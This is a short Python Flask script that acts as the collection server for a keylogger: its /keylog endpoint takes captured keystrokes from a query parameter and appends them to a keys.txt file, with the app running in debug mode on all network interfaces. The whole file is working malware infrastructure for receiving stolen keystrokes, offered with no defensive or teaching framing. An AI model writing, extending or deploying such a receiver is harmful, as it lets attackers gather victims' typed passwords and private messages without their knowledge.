


import flask
from flask import render_template, request
app = flask.Flask(__name__)

def write(key):
    with open('/Users/kaantekiner/Desktop/keys.txt', 'a') as the_file:
        the_file.write(key)

@app.route('/')
def index_page():
    return "test"

@app.route('/keylog')
def keylog():
    gelen = request.args.get('data')
    if gelen == "Key.enter":
        write("\n")
    else:
        write(gelen)
    return str(gelen)

if __name__ == '__main__':
    app.run(debug=True, port=7000, host="0.0.0.0")
